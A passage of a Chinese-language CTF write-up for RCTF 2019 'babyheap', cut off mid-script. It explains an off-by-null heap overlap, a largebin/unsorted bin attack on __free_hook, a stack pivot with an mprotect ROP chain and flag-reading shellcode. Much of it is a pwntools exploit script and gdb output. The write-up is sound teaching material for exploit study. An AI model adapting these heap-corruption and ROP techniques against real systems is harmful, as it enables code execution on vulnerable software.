<p>再次利用off by one构造一个类似的largebin的chunk，在idx6~idx8中进行，先delete(6)，<br>将idx8的大小由0x431覆盖为0x400，同时在idx8里伪造一个大小为0x30的chunk，此时堆的分布如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">12</span>gx <span class="number">0x555555757660</span></span><br><span class="line"><span class="number">0x555555757660</span>: <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000050</span>  <span class="comment">#chunk 7</span></span><br><span class="line"><span class="number">0x555555757670</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757680</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757690</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557576a0</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557576b0</span>: <span class="number">0x00000000000000e0</span>  <span class="number">0x0000000000000400</span>  <span class="comment">#chunk 8 0x430-&gt;0x400</span></span><br><span class="line">gdb-peda$ x /<span class="number">8</span>gx <span class="number">0x5555557576b0</span>+<span class="number">0x400</span></span><br><span class="line"><span class="number">0x555555757ab0</span>: <span class="number">0x0000000000000100</span>  <span class="number">0x0000000000000031</span>  <span class="comment">#fake chunk</span></span><br><span class="line"><span class="number">0x555555757ac0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757ad0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757ae0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span>  <span class="comment">#chunk 9</span></span><br></pre></td></tr></table></figure></p>
<p>这个时候delete(8)会触发chunk 8和chunk 7(0xe0)的合并，idx6~idx8进入到unsortedbin中，大小为0x4e0，这里有一个重叠的chunk 7。<br>对应的exp部分是：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##calloc from unsortedbin 0x70,0x440 put into largebin</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#2 </span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#0x90</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x3f0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x31</span>)) <span class="comment">#chunk8(0x430):0x400+0x30</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x90</span>+<span class="number">0x50</span>)) <span class="comment">#off by null prev_size:0xe0, size:0x400</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#idx6~idx8 into unsorted bin 0x400+0xe0=0x4e0</span></span><br></pre></td></tr></table></figure></p>
<p>分别申请到位于largebin的0x440个位于unsortedbin的0x4e0这两个chunk，idx4的大小为0x440，idx8的大小为0x450。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x430</span>) <span class="comment">#4==1 calloc from largebin</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment">#8==7</span></span><br></pre></td></tr></table></figure></p>
<p>下面构造的是让小的0x440的chunk进入largebin中，0x450的chunk在unsortedbin中，然后修改这两个chunk的bk。先给出exp的部分，然后后面会有解释。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##largebin attack</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#0x450-&gt;0x440</span></span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment">#4==7</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment">#0x450 put into unsortedbin, 0x440 put into largebin</span></span><br><span class="line">edit(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>)) <span class="comment">#0x450</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span><span class="number">-0x18</span><span class="number">-0x5</span>))<span class="comment">#0x440</span></span><br></pre></td></tr></table></figure></p>
<p>此时堆的分布如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555758030</span> (size : <span class="number">0x1ffd0</span>) </span><br><span class="line">       last_remainder: <span class="number">0x555555757660</span> (size : <span class="number">0x450</span>) </span><br><span class="line">            unsortbin: <span class="number">0x555555757660</span> (doubly linked list corruption <span class="number">0x555555757660</span> != <span class="number">0x0</span> <span class="keyword">and</span> <span class="number">0x555555757660</span> <span class="keyword">is</span> broken)</span><br><span class="line">         largebin[ <span class="number">1</span>]: <span class="number">0x555555757080</span> (doubly linked list corruption <span class="number">0x555555757080</span> != <span class="number">0x0</span> <span class="keyword">and</span> <span class="number">0x555555757080</span> <span class="keyword">is</span> broken)</span><br><span class="line">gdb-peda$ x /<span class="number">8</span>gx <span class="number">0x555555757660</span>  <span class="comment">#chunk 0x450 victim</span></span><br><span class="line"><span class="number">0x555555757660</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000451</span></span><br><span class="line"><span class="number">0x555555757670</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd3788</span></span><br><span class="line"><span class="number">0x555555757680</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757690</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">gdb-peda$ x /<span class="number">8</span>gx <span class="number">0x555555757080</span>  <span class="comment">#chunk 0x440</span></span><br><span class="line"><span class="number">0x555555757080</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000441</span></span><br><span class="line"><span class="number">0x555555757090</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x5555557570a0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd376b</span></span><br><span class="line"><span class="number">0x5555557570b0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>对应上面largebin attack部分的代码，这里我们的victim就是0x450的chunk，largebin中只有一个0x440的chunk，两个edit操作后两个chunk的fd、bk、fd_nextsize和bk_nextsize如下。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk = free_hook - 0x20</span><br><span class="line">fwd-&gt;bk = free_hook - 0x18</span><br><span class="line">fwd-&gt;bk_nextsize = free_hook - 0x20 - 0x18 - 0x5</span><br></pre></td></tr></table></figure></p>
<p>首先维护由fd_nextsize和bk_nextsize构成的双向链表:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize = free_hook-0x20-0x18-0x5</span><br><span class="line">fwd-&gt;bk_nextsize = victim</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = *(free_hook-0x20-0x18-0x5+0x20) = *(free_hook-0x18-0x5) = victim  #写入堆地址</span><br></pre></td></tr></table></figure></p>
<p>此时，free_hook - 0x20 - 0x5处写入了victim的堆地址，也就是大小为0x450的chunk的地址。<br>然后再维护fd和bk的双向链表，相当于unsorted bin attack。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk = bck = fwd-&gt;bk = free_hook - 0x18</span><br><span class="line">victim-&gt;fd = fwd</span><br><span class="line">fwd-&gt;bk = victim</span><br><span class="line">bck-&gt;fd = *(free_hook-0x18+0x10) = *(free_hook-0x8) = victim  #写入堆地址</span><br></pre></td></tr></table></figure></p>
<p>此时add一个chunk触发上面的操作，验证上面的分析，可以看到对应地址处写入了victim的堆地址，也就是0x450的堆地址，同时，该chunk分配到free_hook-0x20的chunk。这里只有chunk的地址为56开头时才会成功，前面分析我都关了地址随机化，是为了一致性，看的清楚些，后面的分析会开地址随机化。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;__free_hook</span><br><span class="line">$<span class="number">2</span> = (void (**)(void *, const void *)) <span class="number">0x7ffff7dd37a8</span> &lt;__free_hook&gt;</span><br><span class="line">gdb-peda$ x /gx <span class="number">0x7ffff7dd37a8</span><span class="number">-0x18</span><span class="number">-0x5</span></span><br><span class="line"><span class="number">0x7ffff7dd378b</span> &lt;_IO_stdfile_1_lock+<span class="number">11</span>&gt;: <span class="number">0x0000555555757660</span></span><br><span class="line">gdb-peda$ x /gx <span class="number">0x7ffff7dd37a8</span><span class="number">-0x8</span></span><br><span class="line"><span class="number">0x7ffff7dd37a0</span> &lt;__after_morecore_hook&gt;: <span class="number">0x0000555555757660</span></span><br></pre></td></tr></table></figure></p>
<h2 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h2><p>edit(4)将free_hook修改为libc_base+0x47b75,这个地址有这样一个gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000047B75                 mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:0000000000047B7C                 mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000047B83                 mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000047B87                 mov     r12, [rdi+48h]</span><br><span class="line">.text:0000000000047B8B                 mov     r13, [rdi+50h]</span><br><span class="line">.text:0000000000047B8F                 mov     r14, [rdi+58h]</span><br><span class="line">.text:0000000000047B93                 mov     r15, [rdi+60h]</span><br><span class="line">.text:0000000000047B97                 mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:0000000000047B9E                 push    rcx</span><br><span class="line">.text:0000000000047B9F                 mov     rsi, [rdi+70h]</span><br><span class="line">.text:0000000000047BA3                 mov     rdx, [rdi+88h]</span><br><span class="line">.text:0000000000047BAA                 mov     rcx, [rdi+98h]</span><br><span class="line">.text:0000000000047BB1                 mov     r8, [rdi+28h]</span><br><span class="line">.text:0000000000047BB5                 mov     r9, [rdi+30h]</span><br><span class="line">.text:0000000000047BB9                 mov     rdi, [rdi+68h]</span><br><span class="line">.text:0000000000047BB9 ; &#125; // starts at 47B40</span><br><span class="line">.text:0000000000047BBD ; __unwind &#123;</span><br><span class="line">.text:0000000000047BBD                 xor     eax, eax</span><br><span class="line">.text:0000000000047BBF                 retn</span><br></pre></td></tr></table></figure></p>
<p>在后面delete(10)触发这个rop时rdi的值是chunk 10的数据域起始地址，chunk 10的构造如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##[rdi+0xa0]:chunk 11's data start</span></span><br><span class="line"><span class="comment">##[rdi+0xa8]:retn</span></span><br><span class="line">edit(<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0xa0</span>+p64(heap_base+<span class="number">0x10</span>+<span class="number">0xc20</span>)+p64(<span class="number">0x209b5</span>+libc_base))</span><br></pre></td></tr></table></figure></p>
<p>执行完one_gadget里的第一句之后，将栈迁移到heap_base+0x10+0xc20上，这个地址是chunk 11数据域起始地址，chunk 11的构造如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##0x0000000000021102 : pop rdi ; ret</span></span><br><span class="line">rop = p64(libc_base +<span class="number">0x0000000000021102</span>) + p64(heap_base) <span class="comment">#rdi = heap_base</span></span><br><span class="line"><span class="comment">##0x00000000001150c9 : pop rdx ; pop rsi ; ret</span></span><br><span class="line"><span class="comment">##rdx= 7 rsi = 0x2000 retn mprotect</span></span><br><span class="line"><span class="comment">##mprotect(heap_base,0x2000,0x7) heap_base~heap_base+0x2000:(rw-p)-&gt;(rwxp)</span></span><br><span class="line">rop+= p64(libc_base +<span class="number">0x00000000001150c9</span>) + p64(<span class="number">7</span>) + p64(<span class="number">0x2000</span>) + p64(libc_base+libc.symbols[<span class="string">"mprotect"</span>]) <span class="comment">#length:0x48</span></span><br><span class="line"><span class="comment">##retn shellcode</span></span><br><span class="line">rop+= p64(heap_base+<span class="number">0x48</span>+<span class="number">0xc20</span>) <span class="comment">#heap_base+0xc20:chunk 11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##.string "./flag":push "./flag"</span></span><br><span class="line"><span class="comment">##open("./flag",0)</span></span><br><span class="line"><span class="comment">##read(fd,heap_base+0x48+0xc20,0x100)</span></span><br><span class="line"><span class="comment">##write(1,heap_base+0x48+0xc20,0x100)</span></span><br><span class="line"><span class="comment">##exit()</span></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">       xor rsi,rsi</span></span><br><span class="line"><span class="string">       mov rax,SYS_open</span></span><br><span class="line"><span class="string">       call here</span></span><br><span class="line"><span class="string">       .string "./flag"</span></span><br><span class="line"><span class="string">       here:</span></span><br><span class="line"><span class="string">       pop rdi</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       mov rdi,rax</span></span><br><span class="line"><span class="string">       mov rsi,rsp</span></span><br><span class="line"><span class="string">       mov rdx,0x100</span></span><br><span class="line"><span class="string">       mov rax,SYS_read</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       mov rdi,1</span></span><br><span class="line"><span class="string">       mov rsi,rsp</span></span><br><span class="line"><span class="string">       mov rdx,0x100</span></span><br><span class="line"><span class="string">       mov rax,SYS_write</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       mov rax,SYS_exit</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line">shellcode = asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line">rop += shellcode</span><br><span class="line">edit(<span class="number">11</span>,rop)</span><br></pre></td></tr></table></figure></p>
<p>此时栈的布局如下：<br><img src="/2019/05/26/RCTF-2019-babyheap/1.png" alt="1"><br>继续向下执行，执行到mov rcx,[rdi+0xa8];push rcx指令处，rdi+0xa8我们构造的是p64(0x209b5+libc_base)，这个地址处为retn，one_gadger里面的retn后，执行该指令，然后返回到chunk 11里面的rop:<br><img src="/2019/05/26/RCTF-2019-babyheap/2.png" alt="2"><br>在rop中，rdi是heap_base，然后程序返回到p64(libc_base +0x00000000001150c9)，设置rdx= 7 rsi = 0x2000，然后返回到mprotect函数，执行mprotect(heap_base,0x2000,0x7)，为heap_base~heap_base+0x2000增加可执行权限：<br><img src="/2019/05/26/RCTF-2019-babyheap/3.png" alt="3"><br>最后程序开始执行shellcode来获取flag。这里读的是本地测试的文件：<br><img src="/2019/05/26/RCTF-2019-babyheap/4.png" alt="4"></p>
<p>完整exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'4'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##calloc, no fastbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##init</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x420</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x420</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#10 gadget</span></span><br><span class="line">add(<span class="number">0x400</span>) <span class="comment">#11 rop+shellcode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##off by one</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x3f0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x31</span>)) <span class="comment">#chunk 2(0x430):0x400+0x30</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x80</span>+<span class="number">0x40</span>)) <span class="comment">#off by null prev_size:0xc0, size:0x430-&gt;0x400</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#idx0~idx2 into unsorted bin  0x400+0xc0=0x4c0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x68</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>, hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">##leak heap_base</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2==1</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#usortedbin:0x440-&gt;0x70</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x000056221af4b530</span><span class="number">-0x56221af4b000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base:"</span>, hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##calloc from unsortedbin 0x70,0x440 put into largebin</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#2 </span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#0x90</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x3f0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x31</span>)) <span class="comment">#chunk8(0x430):0x400+0x30</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x90</span>+<span class="number">0x50</span>)) <span class="comment">#off by null prev_size:0xe0, size:0x400</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#idx6~idx8 into unsorted bin 0x400+0xe0=0x4e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x430</span>) <span class="comment">#4==1 calloc from largebin</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment">#8==7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unsorted bin attack</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#0x450-&gt;0x440</span></span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment">#4==7</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment">#0x450 put into unsortedbin, 0x440 put into largebin</span></span><br><span class="line">edit(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>)) <span class="comment">#0x450</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span><span class="number">-0x18</span><span class="number">-0x5</span>))<span class="comment">#0x440</span></span><br><span class="line"></span><br><span class="line">add(<span 